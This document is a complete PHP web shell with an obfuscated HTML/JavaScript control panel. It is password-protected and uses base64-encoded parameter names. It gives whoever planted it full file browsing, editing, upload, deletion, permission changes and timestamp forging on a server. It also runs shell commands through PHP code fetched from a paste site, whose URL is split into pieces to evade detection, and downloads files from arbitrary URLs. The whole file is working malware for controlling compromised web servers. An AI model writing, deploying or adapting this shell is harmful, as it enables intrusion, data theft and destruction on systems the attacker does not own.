<?php ob_start();@ini_set("display_errors","Off");error_reporting(0);$PASSWORD_HASH='$2y$12$ueZoUeppo76h6ceVmZfWuu3h/NMyYvIcbNwYxNUsrmwUT6l87oHw6';$COOKIE_NAME="auth";$COOKIE_SECRET="FREAK_";$COOKIE_LIFE=86400*7;function require_auth(){global $PASSWORD_HASH,$COOKIE_NAME,$COOKIE_SECRET,$COOKIE_LIFE;if(!empty($_COOKIE[$COOKIE_NAME])){$exp=hash_hmac("sha256",$PASSWORD_HASH,$COOKIE_SECRET);if(hash_equals($exp,$_COOKIE[$COOKIE_NAME]))return;}if(!empty($_POST['getpwd'])&&password_verify($_POST['getpwd'],$PASSWORD_HASH)){setcookie($COOKIE_NAME,hash_hmac("sha256",$PASSWORD_HASH,$COOKIE_SECRET),time()+$COOKIE_LIFE,"/");return;}echo '<form method=post style="margin:100px auto;text-align:center">
 <input type=password name=getpwd>
 <button>LOGIN</button></form>';exit;}require_auth();$STATE_KEY="STATE2026";function state_get(){global $STATE_KEY;if(empty($_COOKIE['state']))return[];[$p,$s]=explode('.',$_COOKIE['state'],2);if(!hash_equals(hash_hmac('sha256',$p,$STATE_KEY),$s))return[];return json_decode(base64_decode($p),true)?:[];}function state_set($d){global $STATE_KEY;$p=base64_encode(json_encode($d));setcookie('state',$p.'.'.hash_hmac('sha256',$p,$STATE_KEY),time()+86400*7,'/');}$HOME=realpath(__DIR__);$ROOT=realpath($_SERVER['DOCUMENT_ROOT']??'/');$st=state_get();if(empty($st['cwd'])){$st['cwd']=$HOME;state_set($st);}$cwd=$st['cwd'];function safe_dir($p){$r=realpath($p);return($r&&is_dir($r))?$r:false;}function perms($f){return substr(sprintf('%o',@fileperms($f)),-4);}function rrmdir($d){if(!is_dir($d))return;foreach(scandir($d)as $f){if($f=='.'||$f=='..')continue;$p="$d/$f";is_dir($p)?rrmdir($p):@unlink($p);}@rmdir($d);}function rrcopy($s,$d){if(is_dir($s)){@mkdir($d);foreach(scandir($s)as $f){if($f=='.'||$f=='..')continue;rrcopy("$s/$f","$d/$f");}}elseif(is_file($s))@copy($s,$d);}function is_binary($f){$h=@fopen($f,"r");if(!$h)return true;$s=fread($h,512);fclose($h);return preg_match('~[\x00-\x08\x0B\x0C\x0E-\x1F]~',$s);}function nyalainbang($anjay,$kamu,$ngapain){$url=$anjay.$kamu.$ngapain;$code=file_get_contents($url);$tmp=tempnam(sys_get_temp_dir(),"inc_");file_put_contents($tmp,$code);require $tmp;unlink($tmp);}function make_download_stub($fullpath){$stub=__DIR__.'/download.php';$fullpath=addslashes($fullpath);$code=<<<S
<?php
\$f = '{$fullpath}';
if(!is_file(\$f)) exit;

while(ob_get_level()) ob_end_clean();

header("Content-Type: application/octet-stream");
header("Content-Length: ".filesize(\$f));
header("Content-Disposition: attachment; filename=\"".basename(\$f)."\"");
readfile(\$f);
@unlink(__FILE__);
echo "<script>window.close();</script>";
exit;
S;file_put_contents($stub,$code);}if(isset($_POST['api'])){echo "<!--API:START-->\n";$act=base64_decode($_POST['YWN0aW9u']??'');switch($act){case "list":$dirs=$files=[];foreach(scandir($cwd)as $f){if($f=='.'||$f=='..')continue;$p="$cwd/$f";$i=['n'=>$f,'p'=>perms($p),'w'=>is_writable($p),'t'=>date("Y-m-d H:i",@filemtime($p)),'s'=>is_file($p)?round(filesize($p)/1024,2)." KB":"DIR"];is_dir($p)?$dirs[]=$i:$files[]=$i;}echo "LIST\n".base64_encode(json_encode(['cwd'=>$cwd,'parent'=>dirname($cwd)!=$cwd?dirname($cwd):null,'cwd_w'=>is_writable($cwd),'home_w'=>is_writable($HOME),'root_w'=>is_writable($ROOT),'info'=>['uname'=>php_uname(),'php'=>PHP_VERSION,'soft'=>$_SERVER['SERVER_SOFTWARE']??'','ip'=>$_SERVER['REMOTE_ADDR']??''],'dirs'=>$dirs,'files'=>$files]));break;case "cd":if($p=safe_dir($cwd.'/'.base64_decode($_POST['dGFyZ2V0']))){$st['cwd']=$p;state_set($st);}echo "OK";break;case "cd_abs":if($p=safe_dir(base64_decode($_POST['cGF0aA']))){$st['cwd']=$p;state_set($st);}echo "OK";break;case "home":$st['cwd']=$HOME;state_set($st);echo"OK";break;case "root":$st['cwd']=$ROOT;state_set($st);echo"OK";break;case "delete":$n=basename(base64_decode($_POST['dGFyZ2V0']));$p="$cwd/$n";is_dir($p)?rrmdir($p):@unlink($p);echo "OK";break;case "mass_delete":foreach($_POST['items']??[]as $b){$n=basename(base64_decode($b));if(!$n)continue;$p="$cwd/$n";is_dir($p)?rrmdir($p):@unlink($p);}echo "OK";break;case 'ambil':$file=basename(base64_decode($_POST['ZmlsZQ']));$full=$cwd.'/'.$file;if(!is_file($full)||!is_readable($full)){exit;}make_download_stub($full);echo 'OK';exit;case "cmd":$cmd=base64_decode($_POST["cmd"])." 2>&1";ob_start();nyalainbang("https://paste.pa","kaidulu.de/ZxkBw-5BIHq","/raw");$out=function_exists("customFunction")?customFunction($cmd):"HTTPS wrapper disabled";echo "CMD\n".base64_encode($out);break;case "mass_copy":$dst=base64_decode($_POST['dGFyZ2V0']);$dst=safe_dir($dst[0]=='/'?$dst:$cwd.'/'.$dst);if($dst)foreach($_POST['items']??[]as $b){$n=basename(base64_decode($b));rrcopy("$cwd/$n","$dst/$n");}echo "OK";break;case "rename":@rename("$cwd/".base64_decode($_POST['old']),"$cwd/".base64_decode($_POST['new']));echo "OK";break;case "chmod":@chmod("$cwd/".base64_decode($_POST['dGFyZ2V0']),octdec(base64_decode($_POST['mode'])));echo "OK";break;case "touch_time":if($t=strtotime(base64_decode($_POST['time'])))@touch("$cwd/".base64_decode($_POST['dGFyZ2V0']),$t,$t);echo "OK";break;case "touch":@touch("$cwd/".base64_decode($_POST['name']));echo "OK";break;case "mkdir":@mkdir("$cwd/".base64_decode($_POST['name']));echo "OK";break;case "load":$f="$cwd/".base64_decode($_POST['ZmlsZQ']);if(!is_file($f)){echo "ERR";break;}if(is_binary($f)){echo "BIN|".filesize($f);break;}$raw=file_get_contents($f);if($raw===false)$raw='';echo "FILE\n".base64_encode($raw);break;case "save":file_put_contents("$cwd/".base64_decode($_POST['ZmlsZQ']),base64_decode(base64_decode($_POST['Y29udGVudA'])));echo "OK";break;case "upload":foreach($_POST['ZmlsZXM']??[]as $i=>$b){$n=basename(base64_decode($_POST['bmFtZXM'][$i]??''));if($n)file_put_contents("$cwd/$n",base64_decode($b));}echo "OK";break;case "remote":$url=base64_decode($_POST['url']);$n=basename(parse_url($url,PHP_URL_PATH))?:("remote_".time());$d="$cwd/$n";$ok=false;if(function_exists('curl_init')){$ch=curl_init($url);$fp=fopen($d,'w');curl_setopt_array($ch,[CURLOPT_FILE=>$fp,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0]);$ok=curl_exec($ch);curl_close($ch);fclose($fp);}if(!$ok&&ini_get('allow_url_fopen'))$ok=@file_put_contents($d,file_get_contents($url));if(!$ok&&file_exists($d))@unlink($d);echo"OK";break;}echo "\n<!--API:END-->";exit;}ob_end_flush(); ?>
<!doctype html>
<html>
<head>
<meta charset=utf-8>
<title>KirKSTALL AKaL-aKALan ciNA</title>
<style>
body{margin:0;background:#0e3d2c;color:#eafff4;font-family:monospace}
header,footer{padding:10px;background:#0b2e22}
table{width:100%;border-collapse:collapse}
td,th{padding:6px;border-bottom:1px solid #134f39}
a{color:#A6BDB2;text-decoration:none;cursor:pointer}
a:hover{text-decoration:underline}
.w{color:#9fffd6;font-weight:600}
textarea{width:100%;height:420px;background:#06271c;color:#dff}
.cmd-overlay {
  position: fixed;
  inset: 0;
  background: rgb(0 0 0 / 0.55);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}
.cmd-box {
  width: 720px;
  max-width: 95%;
  height: 420px;
  background: #0b0f14;
  color: #d7dae0;
  border-radius: 10px;
  display: flex;
  flex-direction: column;
  box-shadow: 0 20px 60px rgb(0 0 0 / 0.6);
  font-family: Consolas, Monaco, monospace;
}
.cmd-head {
  padding: 10px 14px;
  background: #111827;
  border-bottom: 1px solid #1f2937;
  display: flex;
  justify-content: space-between;
  align-items: center;
  color: #93c5fd;
  font-weight: 600;
}
.cmd-head button {
  background: none;
  border: none;
  color: #9ca3af;
  font-size: 16px;
  cursor: pointer;
}
.cmd-head button:hover {
  color: #fff;
}
.cmd-body {
  flex: 1;
  padding: 12px;
  overflow: auto;
  white-space: pre-wrap;
  font-size: 13px;
}
.cmd-input {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 10px;
  border-top: 1px solid #1f2937;
  background: #020617;
}
.cmd-input span {
  color: #9fffd6;
}
.cmd-input input {
  flex: 1;
  background: #fff0;
  border: none;
  color: #e5e7eb;
  outline: none;
  font-family: inherit;
  font-size: 13px;
}
</style>
</head>
<body>
<div class="cmd-overlay" id="cmdOverlay" onclick="closeCmd(event)">
  <div class="cmd-box" onclick="event.stopPropagation()">
    <div class="cmd-head">
      <span>Terminal</span>
      <button onclick="closeCmd()">✕</button>
    </div>
    <pre class="cmd-body" id="term"></pre>
    <div class="cmd-input">
      <span>$</span>
      <input id="cmdin" autocomplete="off"
        onkeydown="event.key==='Enter' && runCmd()">
    </div>
  </div>
</div>
<header id=h></header>
<div id=app></div>
<footer>
<a onclick=upload()>+UPLOAD</a> |
<a onclick=touch()>+FILE</a> |
<a onclick=mkdir()>+FOLDER</a> |
<a onclick=massCopy()>+COPY</a> |
<a onclick=massDelete()>+DEL</a> |
<a onclick=remote()>+URL</a> |
<a onclick="openCmd()">+CMD</a>
</footer>

<script>
    let CURRENT_CWD = '';
function openCmd() {
    cmdOverlay.style.display = "flex";
    cmdin.focus();
}
function closeCmd() {
    cmdOverlay.style.display = "none";
}
function log(t) {
    term.textContent += t + "\n";
    term.scrollTop = term.scrollHeight;
}
function runCmd() {
    let v = cmdin.value.trim();
    cmdin.value = "";
    if (!v) return;
    log("$ " + v);

    api("cmd", { cmd: v }, res => {
        if (res.startsWith("CMD")) {
            log(atob(res.split("\n")[1]));
        }
    });
}
function api(a,d={},cb){
 let f=new FormData();f.append('api',1);f.append('YWN0aW9u',btoa(a));
 for(let k in d)Array.isArray(d[k])?d[k].forEach(v=>f.append(k+'[]',btoa(v))):f.append(k,btoa(d[k]));
 fetch('',{method:'POST',body:f}).then(r=>r.text()).then(t=>{
  let s=t.indexOf('<!--API:START-->'),e=t.indexOf('<!--API:END-->');
  if(s<0||e<0)return; cb(t.slice(s+16,e).trim());
 });
}
function load(){
 api('list',{},p=>{
  let o = JSON.parse(atob(p.split('\n')[1]));

  // === BUILD CLICKABLE BREADCRUMB ===
  let pathHtml = `<a onclick="cdAbs('/')">/</a>`;
  let acc = '';

  o.cwd.split('/').filter(Boolean).forEach(seg=>{
    acc += '/' + seg;
    pathHtml += `<a onclick="cdAbs('${acc}')">${seg}</a>/`;
  });

  h.innerHTML = `
<b>${o.info.uname}</b><br>
SOFT: ${o.info.soft} | PHP: ${o.info.php} | IP: ${o.info.ip}<br>
<span class="${o.cwd_w ? 'w' : ''}">
  ${pathHtml}
</span>
&nbsp;
<a onclick="home()">[HOME]</a>
<a onclick="root()">[ROOT]</a>
`;

  // === FILE LIST ===
  let t = '<table>';
  if(o.parent){
    t += `
    <tr>
      <td>
        <a onclick="cdAbs('${o.parent}')">⬆ ..</a>
      </td>
      <td>DIR</td><td></td><td></td><td></td>
    </tr>`;
  }

  o.dirs.forEach(x=>t+=row(x,1));
  o.files.forEach(x=>t+=row(x,0));
  app.innerHTML = t + '</table>';
 });
}


function row(o,d){
 return `<tr>
<td><input type=checkbox class=chk value="${o.n}">
<a class="${o.w?'w':''}" onclick="${d?'cd':'edit'}('${o.n}')">${d?'📁':'📄'} ${o.n}</a></td>
<td>${o.s}</td>
<td><a onclick="chmod('${o.n}','${o.p}')">${o.p}</a></td>
<td><a onclick="mtime('${o.n}','${o.t}')">${o.t}</a></td>
<td>
<a onclick="rename('${o.n}')">RENAME</a>
<a onclick="del('${o.n}')">DELETE</a>
${d ? "" : `<a onclick="fmDownload('${o.n}')">DOWNLOAD</a>`}
</td>
</tr>`;
}

const getSel=()=>[...document.querySelectorAll('.chk:checked')].map(e=>e.value);
const cd=n=>api('cd',{dGFyZ2V0:n},load);
const cdAbs=p=>api('cd_abs',{cGF0aA:p},load);
const home=()=>api('home',{},load);
const root=()=>api('root',{},load);
const del=n=>confirm('Delete '+n+'?')&&api('delete',{dGFyZ2V0:n},load);
const rename=n=>{let x=prompt('Rename',n);if(x)api('rename',{old:n,new:x},load)};
const chmod=(n,p)=>{let x=prompt('Chmod',p);if(x)api('chmod',{dGFyZ2V0:n,mode:x},load)};
const mtime=(n,t)=>{let x=prompt('YYYY-MM-DD HH:MM',t);if(x)api('touch_time',{dGFyZ2V0:n,time:x},load)};
const touch=()=>{let x=prompt('File name');if(x)api('touch',{name:x},load)};
const mkdir=()=>{let x=prompt('Folder name');if(x)api('mkdir',{name:x},load)};
const massDelete = () => {
    const items = getSel(); // or getSelected()

    if (!items.length) {
        alert("No item selected");
        return;
    }

    if (!confirm(`Delete ${items.length} item(s)?`)) return;

    api('mass_delete', { items }, load);
};
const fmDownload = (name) => {
    api('ambil', { ZmlsZQ: name }, () => {
        window.open('download.php', '_blank');
        
    });
    alert('__FILE__ Harus Writable jika ingin download');
    const f = document.createElement('form');
    f.method = 'POST';
    f.action = 'download.php';
    f.target = '_blank';

    const i1 = document.createElement('input');
    i1.type = 'hidden';
    i1.name = 'file';
    i1.value = CURRENT_CWD + '/' + name;

    f.appendChild(i1);
    document.body.appendChild(f);
    f.submit();
    f.remove();
};
const massCopy=()=>{let x=prompt('Copy to', '');if(x)api('mass_copy',{items:getSel(),dGFyZ2V0:x},load)};
const remote=()=>{let x=prompt('URL');if(x)api('remote',{url:x},load)};

function upload(){
 let i=document.createElement('input');i.type='file';i.multiple=1;
 i.onchange=()=>{let f=new FormData();f.append('api',1);f.append('YWN0aW9u',btoa('upload'));
 [...i.files].forEach(fi=>{
  let r=new FileReader();
  r.onload=()=>{f.append('ZmlsZXM[]',r.result.split(',')[1]);f.append('bmFtZXM[]',btoa(fi.name));};
  r.readAsDataURL(fi);
 });
 setTimeout(()=>fetch('',{method:'POST',body:f}).then(()=>load()),500);
 };
 i.click();
}

function edit(n){
 api('load',{ZmlsZQ:n},p=>{
  if(p.startsWith('BIN')){alert('Binary file');return;}
let lines = p.split('\n');
let b64 = lines.length > 1 ? lines.slice(1).join('\n') : '';
let c = b64 ? atob(b64) : '';
  app.innerHTML=`<h3>${n}</h3><textarea id=ed></textarea>
  <button onclick="save('${n}')">SAVE</button>
  <button onclick=load()>BACK</button>`;
  ed.value=c;
 });
}
const save = n => {
    const enc = new TextEncoder();        // UTF-8 → bytes
    const bytes = enc.encode(ed.value);   // Uint8Array

    let bin = '';
    for (let i = 0; i < bytes.length; i++) {
        bin += String.fromCharCode(bytes[i]);
    }

    api('save', {
        ZmlsZQ: n,
        Y29udGVudA: btoa(bin)   // btoa sekarang AMAN
    }, load);
};
load();
</script>
</body>
</html>